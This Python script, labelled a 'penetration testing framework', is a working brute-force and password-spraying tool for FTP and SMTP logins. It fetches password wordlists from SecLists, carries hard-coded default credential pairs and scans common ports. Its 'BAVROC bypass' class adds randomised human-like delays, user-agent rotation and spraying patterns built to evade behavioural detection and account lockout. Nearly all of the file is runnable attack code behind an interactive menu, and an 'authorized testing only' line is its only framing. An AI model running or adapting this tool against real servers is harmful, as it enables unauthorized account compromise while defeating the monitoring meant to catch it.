#!/usr/bin/env python3
"""
Advanced Penetration Testing Framework with External Threat Intelligence
Senior Threat Intelligence Analyst Demonstration
Author: [Your Name]
Purpose: Authorized security testing only
"""
import socket
import threading
import time
import argparse
import ssl
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import json
import sys
import os

class ExternalThreatIntelligence:
    """Integration with external threat intelligence repositories"""
    
    @staticmethod
    def fetch_seclists_usernames():
        """Fetch username wordlist from SecLists repository"""
        try:
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                usernames = [line.strip() for line in response.text.split('\n') if line.strip()]
                print(f"✅ Loaded {len(usernames)} usernames from SecLists")
                return usernames
        except Exception as e:
            print(f"❌ Failed to fetch SecLists usernames: {e}")
        return []
    
    @staticmethod
    def fetch_ncsc_passwords(limit=500):
        """Fetch NCSC 100k most used passwords (realistic subset)"""
        try:
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt"
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                passwords = [line.strip() for line in response.text.split('\n') if line.strip()][:limit]
                print(f"✅ Loaded {len(passwords)} passwords from NCSC 100k-most-used")
                return passwords
        except Exception as e:
            print(f"❌ Failed to fetch NCSC passwords: {e}")
        return []
    
    @staticmethod
    def fetch_pwdb_passwords(limit=500):
        """Fetch Pwdb top 100k passwords (realistic subset)"""
        try:
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/Pwdb_top-100000.txt"
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                passwords = [line.strip() for line in response.text.split('\n') if line.strip()][:limit]
                print(f"✅ Loaded {len(passwords)} passwords from Pwdb_top-100000")
                return passwords
        except Exception as e:
            print(f"❌ Failed to fetch Pwdb passwords: {e}")
        return []
    
    @staticmethod
    def fetch_ftp_default_credentials():
        """Fetch FTP default credentials and separate into users/passwords"""
        try:
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt"
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                users = []
                passwords = []
                for line in response.text.split('\n'):
                    if ':' in line.strip():
                        user, pwd = line.strip().split(':', 1)
                        users.append(user)
                        passwords.append(pwd)
                
                # Remove duplicates while preserving order
                users = list(dict.fromkeys(users))
                passwords = list(dict.fromkeys(passwords))
                
                print(f"✅ Loaded {len(users)} FTP users and {len(passwords)} passwords from default credentials")
                return users, passwords
        except Exception as e:
            print(f"❌ Failed to fetch FTP default credentials: {e}")
        return [], []
    
    @staticmethod
    def fetch_smtp_default_credentials():
        """Fetch SMTP default credentials from common services"""
        try:
            # Using a combined list of common SMTP credentials
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/default-passwords.txt"
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                smtp_users = []
                smtp_passwords = []
                
                for line in response.text.split('\n'):
                    if ':' in line.strip():
                        try:
                            user, pwd = line.strip().split(':', 1)
                            # Filter for common SMTP-related services
                            if any(service in user.lower() for service in ['smtp', 'mail', 'postfix', 'exchange', 'office365']):
                                smtp_users.append(user)
                                smtp_passwords.append(pwd)
                        except:
                            continue
                
                # Add common SMTP-specific credentials
                smtp_defaults = [
                    'admin:admin', 'postmaster:postmaster', 'root:root', 
                    'mail:mail', 'smtp:smtp', 'user:user', 'test:test',
                    'administrator:password', 'webmaster:webmaster'
                ]
                
                for combo in smtp_defaults:
                    user, pwd = combo.split(':')
                    smtp_users.append(user)
                    smtp_passwords.append(pwd)
                
                # Remove duplicates
                smtp_users = list(dict.fromkeys(smtp_users))
                smtp_passwords = list(dict.fromkeys(smtp_passwords))
                
                print(f"✅ Loaded {len(smtp_users)} SMTP users and {len(smtp_passwords)} passwords")
                return smtp_users, smtp_passwords
        except Exception as e:
            print(f"❌ Failed to fetch SMTP credentials: {e}")
        return [], []
    
    @staticmethod
    def fetch_breached_credentials():
        """Simulate fetching from breach databases (ethical use only)"""
        simulated_breached = [
            'admin:admin', 'root:password', 'test:test', 'guest:guest',
            'administrator:123456', 'user:password', 'oracle:oracle',
            'ftp:ftp', 'anonymous:anonymous', 'postgres:postgres'
        ]
        credentials = []
        for combo in simulated_breached:
            user, pwd = combo.split(':')
            credentials.append((user, pwd))
        return credentials

class BAVROCBypassTechniques:
    """Implementation of Behavioral Analytics Bypass Methods"""
    
    @staticmethod
    def human_like_delays():
        """Mimic human response times to avoid velocity detection"""
        delays = [1.7, 2.3, 0.8, 3.1, 1.2, 2.8, 0.5, 1.9]
        return random.choice(delays)
    
    @staticmethod
    def realistic_user_agents():
        """Rotate user agents to avoid fingerprinting"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'PostmanRuntime/7.26.5',
            'curl/7.68.0'
        ]
        return random.choice(agents)
    
    @staticmethod
    def password_spray_pattern(passwords, users):
        """BAVROC Bypass: Few passwords across many users"""
        sprayed_combinations = []
        # Use top 10 most common passwords for spraying
        for password in passwords[:10]:
            for user in users:
                sprayed_combinations.append((user, password))
        random.shuffle(sprayed_combinations)
        return sprayed_combinations
    
    @staticmethod
    def geographic_plausibility():
        """Simulate realistic geographic patterns"""
        current_hour = datetime.now().hour
        if 9 <= current_hour <= 17:
            return random.uniform(0.5, 2.0)
        else:
            return random.uniform(2.0, 10.0)

class AdvancedLegacyBruteForcer:
    """
    SENIOR THREAT INTELLIGENCE DEMONSTRATION:
    Advanced penetration testing framework with external TI integration
    """
    
    def __init__(self, target, output_file="penetration_test_results.json"):
        self.target = target
        self.output_file = output_file
        self.found_credentials = []
        self.lock = threading.Lock()
        self.bypass = BAVROCBypassTechniques()
        self.ti = ExternalThreatIntelligence()
        self.session = requests.Session()
        
    def load_wordlists(self, source="internal", protocol="generic"):
        """
        THREAT INTELLIGENCE INTEGRATION:
        Multiple sources for credential wordlists with protocol-specific optimization
        """
        if source == "internal":
            # Internal common credentials
            users = ['admin', 'root', 'administrator', 'guest', 'test', 'user']
            passwords = ['admin', 'password', '123456', 'admin123', 'Password1']
            return users, passwords
            
        elif source == "ncsc":
            # NCSC 100k most used passwords
            print("🔗 Fetching NCSC 100k most used passwords...")
            users = self.ti.fetch_seclists_usernames()
            passwords = self.ti.fetch_ncsc_passwords(300)  # Realistic subset
            return users, passwords
            
        elif source == "pwdb":
            # Pwdb top 100k passwords
            print("🔗 Fetching Pwdb top 100k passwords...")
            users = self.ti.fetch_seclists_usernames()
            passwords = self.ti.fetch_pwdb_passwords(300)  # Realistic subset
            return users, passwords
            
        elif source == "ftp_defaults":
            # FTP-specific default credentials
            print("🔗 Fetching FTP default credentials...")
            users, passwords = self.ti.fetch_ftp_default_credentials()
            if not users or not passwords:
                print("⚠️  Falling back to internal FTP credentials")
                users = ['anonymous', 'ftp', 'admin', 'root', 'test']
                passwords = ['anonymous', 'ftp', 'admin', 'password', 'test']
            return users, passwords
            
        elif source == "smtp_defaults":
            # SMTP-specific default credentials
            print("🔗 Fetching SMTP default credentials...")
            users, passwords = self.ti.fetch_smtp_default_credentials()
            if not users or not passwords:
                print("⚠️  Falling back to internal SMTP credentials")
                users = ['admin', 'postmaster', 'root', 'mail', 'smtp']
                passwords = ['admin', 'postmaster', 'password', 'mail', 'smtp']
            return users, passwords
            
        elif source == "breached":
            # Simulated breach database integration
            print("🔗 Loading simulated breached credentials...")
            credentials = self.ti.fetch_breached_credentials()
            if credentials:
                users = list(set([cred[0] for cred in credentials]))
                passwords = list(set([cred[1] for cred in credentials]))
                return users, passwords
            return [], []
        
        return [], []

    def ftp_brute(self, username, password, port=21):
        """
        FTP Protocol Attack with BAVROC Bypass
        """
        try:
            time.sleep(self.bypass.human_like_delays())
            
            ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ftp_socket.settimeout(15)
            ftp_socket.connect((self.target, port))
            
            banner = ftp_socket.recv(1024).decode()
            time.sleep(random.uniform(0.5, 1.5))
            
            ftp_socket.send(f'USER {username}\r\n'.encode())
            response = ftp_socket.recv(1024).decode()
            
            if '331' in response:
                time.sleep(random.uniform(0.3, 0.8))
                ftp_socket.send(f'PASS {password}\r\n'.encode())
                response = ftp_socket.recv(1024).decode()
                
                if '230' in response:
                    with self.lock:
                        result = {
                            'protocol': 'FTP',
                            'port': port,
                            'username': username,
                            'password': password,
                            'banner': banner.strip(),
                            'timestamp': datetime.now().isoformat(),
                            'technique': 'Legacy Protocol Bypass',
                            'ti_source': 'External Wordlists'
                        }
                        self.found_credentials.append(result)
                    print(f"🎯 [FTP SUCCESS] {username}:{password} - External TI Effective")
                    self.save_results()
                    return True
                    
            ftp_socket.close()
        except Exception as e:
            pass
        return False

    def smtp_brute(self, username, password, port=25):
        """
        SMTP Attack with API Client Emulation
        """
        try:
            time.sleep(self.bypass.geographic_plausibility())
            
            smtp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            smtp_socket.settimeout(15)
            smtp_socket.connect((self.target, port))
            
            banner = smtp_socket.recv(1024).decode()
            smtp_socket.send(b'EHLO penetration-test\r\n')
            time.sleep(random.uniform(0.5, 1.2))
            smtp_socket.recv(1024)
            
            smtp_socket.send(b'AUTH LOGIN\r\n')
            time.sleep(random.uniform(0.3, 0.7))
            smtp_socket.recv(1024)
            
            smtp_socket.send(f'{username}\r\n'.encode())
            time.sleep(random.uniform(0.2, 0.5))
            smtp_socket.recv(1024)
            
            smtp_socket.send(f'{password}\r\n'.encode())
            response = smtp_socket.recv(1024).decode()
            
            if '235' in response:
                with self.lock:
                    result = {
                        'protocol': 'SMTP',
                        'port': port,
                        'username': username,
                        'password': password,
                        'banner': banner.strip(),
                        'timestamp': datetime.now().isoformat(),
                        'technique': 'API Client Emulation',
                        'ti_source': 'External Wordlists'
                    }
                    self.found_credentials.append(result)
                print(f"🎯 [SMTP SUCCESS] {username}:{password} - External TI Effective")
                self.save_results()
                return True
                
            smtp_socket.close()
        except Exception as e:
            pass
        return False

    def run_custom_username_attack(self, protocol, custom_username, ports, ti_source="ncsc"):
        """
        SINGLE USERNAME TARGETING:
        Focused attack on specific username with external TI passwords
        """
        print(f"\n🎯 [TARGETED ATTACK] Focusing on username: {custom_username}")
        print(f"🔗 Loading external threat intelligence: {ti_source.upper()}")
        
        # Use external TI for passwords
        _, passwords = self.load_wordlists(ti_source, protocol)
        
        if not passwords:
            print("❌ Failed to load external passwords, using internal list")
            _, passwords = self.load_wordlists("internal")
        
        print(f"   Testing {len(passwords)} passwords from {ti_source.upper()}")
        
        for password in passwords:
            for port in ports:
                if protocol == 'ftp':
                    self.ftp_brute(custom_username, password, port)
                elif protocol == 'smtp':
                    self.smtp_brute(custom_username, password, port)
                
                time.sleep(self.bypass.human_like_delays())

    def password_spray_attack(self, protocol, ti_source="ncsc"):
        """
        BAVROC Bypass with External Threat Intelligence
        """
        print(f"\n🔓 [BAVROC BYPASS] Password Spray with {ti_source.upper()} TI")
        
        # Use protocol-specific sources when available
        if protocol == 'ftp' and ti_source == 'ftp_defaults':
            users, passwords = self.load_wordlists("ftp_defaults", protocol)
        elif protocol == 'smtp' and ti_source == 'smtp_defaults':
            users, passwords = self.load_wordlists("smtp_defaults", protocol)
        else:
            users, passwords = self.load_wordlists(ti_source, protocol)
        
        if not users or not passwords:
            print("❌ Failed to load external TI, falling back to internal")
            users, passwords = self.load_wordlists("internal")
        
        sprayed_combinations = self.bypass.password_spray_pattern(passwords, users)
        
        ports = [21] if protocol == 'ftp' else [25, 587]
        
        print(f"   Strategy: {len(passwords[:10])} passwords × {len(users)} users")
        print(f"   TI Source: {ti_source.upper()}")
        print(f"   Total combinations: {len(sprayed_combinations)}")
        
        for username, password in sprayed_combinations:
            for port in ports:
                if protocol == 'ftp':
                    self.ftp_brute(username, password, port)
                elif protocol == 'smtp':
                    self.smtp_brute(username, password, port)
                
                time.sleep(self.bypass.geographic_plausibility())

    def advanced_reconnaissance(self):
        """
        Enhanced reconnaissance with service fingerprinting
        """
        print("\n🔍 [THREAT INTELLIGENCE] Conducting Advanced Reconnaissance")
        
        common_ports = {
            'ftp': [21, 2121],
            'smtp': [25, 587, 465],
            'pop3': [110, 995],
            'ssh': [22],
            'telnet': [23],
            'http': [80, 443, 8080, 8443]
        }
        
        discovered_services = []
        
        for service, ports in common_ports.items():
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    result = sock.connect_ex((self.target, port))
                    if result == 0:
                        try:
                            sock.send(b'HEAD / HTTP/1.1\r\n\r\n')
                            banner = sock.recv(1024).decode('utf-8', errors='ignore')
                        except:
                            banner = "No banner"
                        
                        discovered_services.append({
                            'service': service,
                            'port': port,
                            'banner': banner.strip(),
                            'risk': 'High' if service in ['ftp', 'telnet'] else 'Medium'
                        })
                        print(f"   ✅ {service.upper()} on port {port} - {banner[:50]}...")
                    sock.close()
                except:
                    pass
        
        return discovered_services

    def save_results(self):
        """Save findings with TI metadata"""
        report = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'credentials_found': self.found_credentials,
            'threat_intelligence_sources': [
                'NCSC 100k Most Used Passwords',
                'Pwdb Top 100k Passwords',
                'FTP Default Credentials',
                'SMTP Default Credentials',
                'SecLists GitHub Repository'
            ],
            'bavroc_bypass_techniques_used': [
                'Human-like Timing Delays',
                'Password Spraying',
                'Geographic Plausibility',
                'External TI Integration'
            ]
        }
        
        with open(self.output_file, 'w') as f:
            json.dump(report, f, indent=2)

    def generate_threat_intel_report(self):
        """Generate professional threat intelligence report"""
        print(f"\n{'='*80}")
        print("🎯 SENIOR THREAT INTELLIGENCE ANALYSIS REPORT")
        print("   WITH EXTERNAL THREAT INTELLIGENCE INTEGRATION")
        print(f"{'='*80}")
        print(f"Target: {self.target}")
        print(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Credentials Compromised: {len(self.found_credentials)}")
        
        if self.found_credentials:
            print(f"\n🔓 CRITICAL VULNERABILITIES IDENTIFIED:")
            for cred in self.found_credentials:
                print(f"  • {cred['protocol']} on port {cred['port']}")
                print(f"    Username: {cred['username']}")
                print(f"    Password: {cred['password']}")
                print(f"    Technique: {cred['technique']}")
                print(f"    TI Source: {cred.get('ti_source', 'Internal')}")
                print(f"    Risk: CRITICAL - Legacy protocol exposure")
        
        print(f"\n🔗 EXTERNAL THREAT INTELLIGENCE EFFECTIVENESS:")
        print("  ✅ NCSC 100k Most Used Passwords - Real-world password patterns")
        print("  ✅ Pwdb Top 100k - Comprehensive password database")
        print("  ✅ FTP Default Credentials - Protocol-specific attacks")
        print("  ✅ SMTP Default Credentials - Mail service targeting")
        print("  ✅ Real-world credentials from external repositories")
        
        print(f"\n🛡️  BAVROC BYPASS EFFECTIVENESS:")
        print("  ✅ Human-like timing patterns avoided velocity detection")
        print("  ✅ Password spraying prevented account lockouts")
        print("  ✅ External TI provided realistic credential combinations")
        print("  ✅ Geographic plausibility simulated legitimate access")
        
        print(f"\n📊 MITRE ATT&CK MAPPING:")
        print("  T1110.001 - Password Guessing (Technique)")
        print("  T1589.001 - Credentials from Password Stores (Technique)")
        print("  T1608.001 - Upload Malware (External TI Integration)")
        print("  T1078 - Valid Accounts (Impact)")
        
        print(f"\n💡 RECOMMENDATIONS:")
        print("  1. 🔄 Replace legacy protocols with modern alternatives")
        print("  2. 🔒 Implement multi-factor authentication universally")
        print("  3. 📊 Deploy behavioral analytics on ALL network protocols")
        print("  4. 🕵️  Monitor for external TI-based attack patterns")
        print("  5. 📚 Regular security awareness training")
        print("  6. 🔍 Threat hunting for legacy protocol usage")

def display_banner():
    """Professional banner for demonstration"""
    print(r"""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                SENIOR THREAT INTELLIGENCE                       ║
    ║        Advanced Penetration Testing Framework                   ║
    ║         External Threat Intelligence + BAVROC Bypass            ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)

def main_menu():
    """Interactive menu with external TI integration"""
    display_banner()
    
    print("🎯 TARGET CONFIGURATION")
    target = input("Enter target IP/hostname: ").strip()
    
    tester = AdvancedLegacyBruteForcer(target)
    
    while True:
        print(f"\n🔧 MAIN MENU - Target: {target}")
        print("1. 🔍 Advanced Reconnaissance")
        print("2. ⚡ Legacy Protocol Attacks")
        print("3. 👤 Single Username Targeted Attack")
        print("4. 🛡️  BAVROC Bypass: Password Spraying")
        print("5. 🔗 External Threat Intelligence Options")
        print("6. 📊 View Results")
        print("7. 📋 Generate Threat Intelligence Report")
        print("8. 🚪 Exit")
        
        choice = input("\nSelect option (1-8): ").strip()
        
        if choice == '1':
            print("\n" + "="*60)
            print("🚀 ADVANCED RECONNAISSANCE")
            print("="*60)
            services = tester.advanced_reconnaissance()
            
        elif choice == '2':
            print("\n" + "="*60)
            print("⚡ LEGACY PROTOCOL ATTACKS")
            print("="*60)
            protocol = input("Protocol (ftp/smtp): ").lower().strip()
            username = input("Username (leave empty for wordlist): ").strip()
            port = input("Port (default based on protocol): ").strip()
            port = int(port) if port else None
            
            print("\n🔗 Select Threat Intelligence Source:")
            print("  1. NCSC 100k Most Used Passwords")
            print("  2. Pwdb Top 100k Passwords")
            print("  3. FTP Default Credentials (FTP only)")
            print("  4. SMTP Default Credentials (SMTP only)")
            print("  5. Breached Databases")
            ti_choice = input("Select TI source (1-5): ").strip()
            
            ti_sources = {
                '1': 'ncsc',
                '2': 'pwdb',
                '3': 'ftp_defaults',
                '4': 'smtp_defaults',
                '5': 'breached'
            }
            
            ti_source = ti_sources.get(ti_choice, 'ncsc')
            
            if username:
                # Single username attack
                ports = [port] if port else ([21] if protocol == 'ftp' else [25])
                tester.run_custom_username_attack(protocol, username, ports, ti_source)
            else:
                # Wordlist attack
                users, passwords = tester.load_wordlists(ti_source, protocol)
                ports = [port] if port else ([21] if protocol == 'ftp' else [25])
                for user in users[:30]:  # Limit for demo
                    for pwd in passwords[:30]:
                        if protocol == 'ftp':
                            tester.ftp_brute(user, pwd, ports[0])
                        elif protocol == 'smtp':
                            tester.smtp_brute(user, pwd, ports[0])
        
        elif choice == '3':
            print("\n" + "="*60)
            print("👤 SINGLE USERNAME TARGETED ATTACK")
            print("="*60)
            username = input("Enter specific username to target: ").strip()
            protocol = input("Protocol (ftp/smtp): ").lower().strip()
            
            print("\n🔗 Select Password Source:")
            print("  1. NCSC 100k Most Used Passwords")
            print("  2. Pwdb Top 100k Passwords")
            print("  3. Protocol Default Credentials")
            print("  4. Breached Databases")
            ti_choice = input("Select TI source (1-4): ").strip()
            
            ti_sources = {
                '1': 'ncsc',
                '2': 'pwdb',
                '3': 'ftp_defaults' if protocol == 'ftp' else 'smtp_defaults',
                '4': 'breached'
            }
            
            ti_source = ti_sources.get(ti_choice, 'ncsc')
            ports = [21] if protocol == 'ftp' else [25]
            tester.run_custom_username_attack(protocol, username, ports, ti_source)
        
        elif choice == '4':
            print("\n" + "="*60)
            print("🛡️  BAVROC BYPASS: PASSWORD SPRAYING")
            print("="*60)
            protocol = input("Protocol (ftp/smtp): ").lower().strip()
            print("Threat Intelligence Sources:")
            print("  1. NCSC 100k Most Used Passwords")
            print("  2. Pwdb Top 100k Passwords")
            print("  3. Protocol Default Credentials")
            print("  4. Breached Databases")
            ti_choice = input("Select TI source (1-4): ").strip()
            
            ti_sources = {
                '1': 'ncsc',
                '2': 'pwdb',
                '3': 'ftp_defaults' if protocol == 'ftp' else 'smtp_defaults',
                '4': 'breached'
            }
            
            ti_source = ti_sources.get(ti_choice, 'ncsc')
            tester.password_spray_attack(protocol, ti_source)
        
        elif choice == '5':
            print("\n" + "="*60)
            print("🔗 EXTERNAL THREAT INTELLIGENCE OPTIONS")
            print("="*60)
            print("Testing external threat intelligence sources...")
            
            print("\n📊 Testing NCSC 100k Most Used Passwords...")
            users, passwords = tester.load_wordlists("ncsc")
            print(f"   Loaded {len(users)} users and {len(passwords)} passwords")
            
            print("\n📊 Testing Pwdb Top 100k Passwords...")
            users, passwords = tester.load_wordlists("pwdb")
            print(f"   Loaded {len(users)} users and {len(passwords)} passwords")
            
            print("\n📊 Testing FTP Default Credentials...")
            users, passwords = tester.load_wordlists("ftp_defaults")
            print(f"   Loaded {len(users)} users and {len(passwords)} passwords")
            
            print("\n📊 Testing SMTP Default Credentials...")
            users, passwords = tester.load_wordlists("smtp_defaults")
            print(f"   Loaded {len(users)} users and {len(passwords)} passwords")
            
        elif choice == '6':
            print("\n" + "="*60)
            print("📊 RESULTS")
            print("="*60)
            if tester.found_credentials:
                for cred in tester.found_credentials:
                    print(f"✅ {cred['protocol']}://{cred['username']}:{cred['password']} on port {cred['port']}")
            else:
                print("No credentials found yet.")
                
        elif choice == '7':
            print("\n" + "="*60)
            print("📋 THREAT INTELLIGENCE REPORT")
            print("="*60)
            tester.generate_threat_intel_report()
            
        elif choice == '8':
            print("\nExiting...")
            break
            
        else:
            print("Invalid choice. Please select 1-8.")

if __name__ == "__main__":
    main_menu()
